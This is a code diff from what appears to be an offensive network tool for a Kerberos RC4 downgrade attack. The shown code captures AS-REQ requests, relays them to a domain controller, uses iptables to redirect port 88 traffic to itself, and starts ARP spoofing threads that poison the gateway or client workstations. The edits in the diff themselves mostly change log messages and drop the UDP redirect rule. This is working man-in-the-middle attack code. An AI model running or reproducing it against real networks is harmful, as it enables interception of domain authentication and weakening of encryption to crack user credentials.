@@ -200,7 +200,7 @@ async def relay_to_dc(data, client_address):
         if username not in UsernamesCaptured :
             logging.info(f'[+] AS-REQ coming from {client_address} for {username}@{domain} : RC4 is supported by the client. The downgrade attack could work')
     elif kerberos_packet.haslayer(KRB_AS_REQ) and len(kerberos_packet.root.padata) != 2 and ASN1_INTEGER(23) not in kerberos_packet.root.reqBody.etype :
-        logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may be disabled on client workstations...')
+        logging.warning(f'[-] AS-REQ coming from {client_address} for {username}@{domain} : RC4 not supported by the client. RC4 may disabled on client workstations...')
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     client_socket.connect((host, port))
     client_socket.sendall(data)
@@ -239,7 +239,6 @@ async def relay_server():
     os.system("iptables -F -t nat")
     logging.info('[*] Saved current iptables\n\n')
     os.system(f'iptables -t nat -A PREROUTING -i {iface} -p tcp --dport 88 -j DNAT --to 127.0.0.1:88')
-    os.system(f'iptables -t nat -A PREROUTING -i {iface} -p udp --dport 88 -j DNAT --to 127.0.0.1:88')
     os.system(f'sysctl -w net.ipv4.conf.{iface}.route_localnet=1 1>/dev/null')
 
     server = await asyncio.start_server(handle_client, '0.0.0.0', 88)
@@ -419,6 +418,7 @@ if __name__ == '__main__':
         if parameters.mode == 'listen':
             thread = threading.Thread(target=listenmode_arp_spoof)
             thread.start()
+            logging.info('[+] ARP poisoning the gateway')
         elif parameters.mode == 'relay' :
             Targets = Targets - (Targets - set(mac_addresses.keys()))
             if Targets == set() :
@@ -426,8 +426,7 @@ if __name__ == '__main__':
                 sys.exit(1)
             thread = threading.Thread(target=relaymode_arp_spoof, args=(gw,))
             thread.start()
-
-        logging.info('[+] Started ARP spoofing')
+            logging.info('[+] ARP poisoning the client workstations')
         logging.debug(f'[*] Net probe check, targets list : {list(Targets)}')
     else :
         logging.warning(f'[!] ARP spoofing disabled')
